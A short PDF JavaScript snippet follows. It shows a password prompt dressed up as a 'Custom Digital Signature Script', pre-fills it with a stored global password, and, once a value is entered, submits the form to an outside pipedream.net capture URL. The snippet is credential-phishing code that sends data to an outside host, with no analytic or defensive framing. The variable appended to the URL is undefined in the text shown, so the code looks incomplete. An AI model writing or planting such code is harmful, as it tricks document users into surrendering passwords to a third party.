var pass = app.response ({ cQuestion:"Enter your password to prove your identity", cTitle:"Custom Digital Signature Script", bPassword:true, cDefault: global.cLastPswd, cLabel:"Password"}); 
if(pass && pass.length) { 
    this.submitForm("https://enjuakyy72wah.x.pipedream.net/"+ cRtn);
} else app.alert("Signing Failed");